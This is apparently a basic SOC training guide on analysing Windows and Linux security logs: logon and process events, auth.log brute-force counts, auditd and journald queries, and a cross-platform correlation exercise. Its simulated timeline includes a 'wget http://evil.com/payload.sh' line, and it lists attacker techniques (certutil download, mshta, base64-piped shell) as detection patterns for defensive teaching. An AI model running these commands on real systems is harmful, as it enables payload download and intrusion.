# Guide 03: Analyzing OS Security Logs

**Level:** Basic

**Estimated time:** 50 minutes

**Prerequisites:** Session 12 reading (Sections 4, 8, 12, 13)

---

## Objective

By the end of this guide you will be able to:

* Parse Windows Security Event Log for key authentication and process events
* Search Linux auth.log and auditd for suspicious activity
* Identify brute-force attacks, privilege escalation, and persistence from logs
* Use journalctl for structured Linux log queries
* Correlate events across multiple log sources

---

## Setup

```console
cd guides/basic/guide-03-os-log-analysis
docker compose up --build
docker compose exec log-analysis bash
```

Pre-populated sample log files are in `/var/log/samples/`.

---

## Part A: Windows Event Log Analysis

Windows Event Logs are analyzed using PowerShell.
The container provides sample event log data in JSON format.

### A.1: Parsing Logon Events (Event ID 4624/4625)

```console
# In the container, use Python to analyze Windows event log JSON samples
python3 /scripts/analyze_windows_logs.py --type logon
```

**Manual analysis — understanding the key fields:**

```text
Event ID 4624: An account was successfully logged on

Key fields to extract:
  SubjectUserName:  who initiated the logon (often SYSTEM for network logons)
  TargetUserName:   who is logging in
  LogonType:        2=interactive, 3=network, 10=RemoteInteractive(RDP)
  IpAddress:        source IP address
  IpPort:           source port
  LogonProcessName: Authentication package used (NtLmSsp, Kerberos, etc.)

Suspicious indicators:
  - Logon Type 3 (Network) outside business hours
  - Multiple logons from unexpected IP addresses
  - Logon Type 10 (RDP) from external IPs
  - ANONYMOUS LOGON or SYSTEM logon events from network
```

**Sample Windows logon log parsing (Python):**

```python
# Sample log entry analysis (run in container: python3 /scripts/parse_logon.py)
import json, sys

# Sample event data (simulates Event ID 4624)
events = [
    {"id": 4624, "time": "2024-01-14 14:47:23", "user": "alice", "type": 3, "ip": "10.0.5.123", "port": 54321},
    {"id": 4624, "time": "2024-01-14 09:00:00", "user": "alice", "type": 10, "ip": "192.168.1.5", "port": 49152},
    {"id": 4625, "time": "2024-01-14 14:23:01", "user": "alice", "type": 3, "ip": "10.0.5.123", "port": 52000},
]

print("=== LOGON EVENT ANALYSIS ===")
for ev in events:
    flag = ""
    if ev["ip"] not in ["192.168.1.5", "127.0.0.1"] and ev["id"] == 4624:
        flag = "  *** UNUSUAL SOURCE IP ***"
    if ev["id"] == 4625:
        flag = "  [FAILED]"
    logon_type = {2: "Interactive", 3: "Network", 10: "RDP"}
    print(f"  {ev['time']}  {ev['id']}  User:{ev['user']:<12} Type:{logon_type.get(ev['type'],'?'):<12} From:{ev['ip']}{flag}")
```

### A.2: Process Creation Analysis (Event ID 4688)

```console
python3 /scripts/analyze_windows_logs.py --type process
```

**What to look for in process creation events:**

```text
Suspicious process creation patterns:

1. LOLBin execution (Living off the Land):

   - certutil.exe with -urlcache (file download)
   - mshta.exe with URL argument (HTA execution)
   - regsvr32.exe with /i: URL
   - bitsadmin.exe with /transfer

2. Unusual parent-child relationships:
   - winword.exe → cmd.exe (macro executing cmd)
   - outlook.exe → powershell.exe (phishing attachment)
   - iexplore.exe → wscript.exe (drive-by download)
   - svchost.exe → cmd.exe (hollow process)

3. Execution from suspicious paths:
   - %TEMP%\*.exe
   - %APPDATA%\*.exe
   - C:\Users\*\Downloads\*.exe
   - C:\ProgramData\*.exe (not in Program Files)

4. Encoded commands:
   - powershell.exe -EncodedCommand [base64]
   - cmd.exe /c "echo [payload] | base64 -d | bash"
```

```bash
# Analyze sample process events
cat /var/log/samples/windows_process_events.json | python3 -c "
import json, sys
events = json.load(sys.stdin)
for ev in events:
    cmdline = ev.get('cmdline', '')
    suspicious = any(x in cmdline.lower() for x in ['encodedcommand', 'urlcache', 'temp\\\\', 'mshta', 'regsvr32'])
    flag = '  *** SUSPICIOUS ***' if suspicious else ''
    print(f'  {ev[\"time\"]}  {ev[\"process\"]:<20} Parent:{ev[\"parent\"]:<20}{flag}')
    if cmdline and len(cmdline) > 20:
        print(f'    CMD: {cmdline[:80]}...')
"
```

### A.3: Critical Windows Security Event Patterns

```bash
cat << 'EOF'
=== Windows Event ID Quick Reference ===

AUTHENTICATION:
  4624 - Logon success (check Logon Type and source IP)
  4625 - Logon failure (count by user/IP for brute force)
  4648 - Explicit credential use (Pass-the-Hash indicator)
  4672 - Special privileges assigned (admin logged in)
  4740 - Account locked out (brute force victim)

PROCESS:
  4688 - Process created (enable CommandLine logging!)
  4689 - Process terminated

LATERAL MOVEMENT:
  4776 - NTLM validation (detect relay attacks)
  4768 - Kerberos TGT request
  4769 - Kerberos service ticket (Kerberoasting: many 4769 in short time)

PERSISTENCE:
  4698 - Scheduled task created
  4699 - Scheduled task deleted (anti-forensics)
  7045 - New service installed

ANTI-FORENSICS:
  1102 - Security log cleared (CRITICAL!)
  104  - System log cleared

DEFENDER ATP:
  5001 - Windows Defender realtime disabled (CRITICAL!)
  5007 - Windows Defender configuration changed
EOF
```

---

## Part B: Linux Log Analysis

### B.1: auth.log — Authentication Events

```bash
# Review the sample auth.log
less /var/log/samples/auth.log

# Count failed SSH attempts by source IP (brute force detection)
echo "=== Brute Force Candidates (Failed SSH by IP) ==="
grep "Failed password" /var/log/samples/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Expected output:
# 247 10.0.5.123    <-- this is a brute force attack
#   3 192.168.1.10
#   1 10.0.0.1
```

```bash
# Find successful logins that preceded failures (compromise after brute force)
echo "=== Attacker IPs with Success After Failures ==="
ATTACKER_IPS=$(grep "Failed password" /var/log/samples/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | awk '$1 > 10 {print $2}')

for ip in $ATTACKER_IPS; do
    success=$(grep "Accepted.*$ip" /var/log/samples/auth.log)
    if [ -n "$success" ]; then
        echo "  BREACH: IP $ip had failures AND a successful login!"
        echo "  $success"
    fi
done
```

```bash
# Trace what the attacker did after login
echo "=== Post-Login Activity ==="
# Find the session start time
BREACH_TIME=$(grep "Accepted.*10.0.5.123" /var/log/samples/auth.log | awk '{print $3}')
echo "Breach time: $BREACH_TIME"

# Find sudo commands after that time
grep "COMMAND" /var/log/samples/auth.log | awk -v t="$BREACH_TIME" '$3 >= t'

# Find new accounts created after breach
grep "useradd\|adduser" /var/log/samples/auth.log | awk -v t="$BREACH_TIME" '$3 >= t'
```

### B.2: auditd Log Analysis

```bash
# Review sample auditd log
echo "=== auditd Log Structure ==="
head -10 /var/log/samples/audit.log

# Search for privilege escalation events
echo ""
echo "=== sudo Usage (privileged-sudo key) ==="
ausearch -if /var/log/samples/audit.log -k privileged-sudo -i 2>/dev/null || \
  grep 'privileged-sudo' /var/log/samples/audit.log | head -10

echo ""
echo "=== Identity File Modifications ==="
ausearch -if /var/log/samples/audit.log -k identity -i 2>/dev/null || \
  grep 'identity' /var/log/samples/audit.log | head -20

echo ""
echo "=== Cron Modifications ==="
ausearch -if /var/log/samples/audit.log -k scheduled-jobs -i 2>/dev/null || \
  grep 'scheduled-jobs' /var/log/samples/audit.log | head -10
```

```bash
# Generate summary report
echo "=== Audit Summary Report ==="
aureport -if /var/log/samples/audit.log --summary 2>/dev/null || \
  echo "aureport: analyzing simulated data..."

# Failed operations (potential attack indicators)
echo ""
echo "=== Failed Events ==="
aureport -if /var/log/samples/audit.log --failed 2>/dev/null || \
  grep 'success=no' /var/log/samples/audit.log | wc -l
```

### B.3: journald Analysis

```bash
# Generate some log entries to analyze
systemctl start cron 2>/dev/null || service cron start 2>/dev/null || true
logger -p auth.warning "Test: suspicious activity from 10.0.5.123"
logger -p auth.info "sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash"

# Query journal
echo "=== journald Security Events ==="
journalctl -p warning --no-pager | tail -10

echo ""
echo "=== All authentication events ==="
journalctl _TRANSPORT=syslog SYSLOG_FACILITY=10 --no-pager | tail -20

echo ""
echo "=== Kernel messages (MAC violations would appear here) ==="
journalctl -k --no-pager | tail -10
```

---

## Part C: Cross-Platform Log Correlation Exercise

You have been given logs from a hybrid environment.
A workstation was compromised.
Correlate the logs to answer:

```console
# Run the correlation exercise
python3 /scripts/correlation_exercise.py
```

**Exercise scenario:**

```text
09:00  Windows Event 4624: alice logged into WORKSTATION1 from 192.168.1.5 (her desk)
14:47  Windows Event 4624: alice logged into FILESERVER1 from 10.0.5.123 (unknown IP!)
14:47  Linux auth.log:     SSH login as alice from 10.0.5.123 to FILESERVER1
14:48  Linux auditd:       alice ran sudo su - on FILESERVER1
14:48  Linux auditd:       root: wget http://evil.com/payload.sh
14:49  Windows Event 4698: Scheduled task created on WORKSTATION1
14:50  Windows Event 7045: Service 'WindowsUpdate' installed on WORKSTATION1
15:10  Windows Event 1102: Security log cleared on WORKSTATION1
```

**Questions:**

1. What is alice's normal source IP address?
1. What IP did the attacker use? How do you know it's the attacker?
1. Which system was compromised first — Windows or Linux?
1. List the 5 attack stages (Initial Access → Persistence) in order
1. Which log source provided the most detailed evidence?
1. What defensive controls would have prevented/detected this earlier?

---

## Summary

You have practiced log analysis across both Windows and Linux:

| Log Source | Tool | Key Searches |
|-----------|------|-------------|
| Windows Security.evtx | PowerShell Get-WinEvent, Python | 4624/4625 logon, 4688 process, 7045 service |
| Linux auth.log | grep, awk | Failed password, Accepted, COMMAND |
| Linux auditd | ausearch, aureport | -k identity, -k privileged-sudo |
| Linux journald | journalctl | -u service, _COMM=sudo, -p warning |

**Key skills for SOC:**

* Identifying brute force by counting failures per IP/user
* Correlating failed logins with subsequent successful login (breach confirmation)
* Tracing privilege escalation from sudo/COMMAND entries
* Detecting persistence from cron/service/task creation events
* Using multiple log sources to build a complete incident timeline
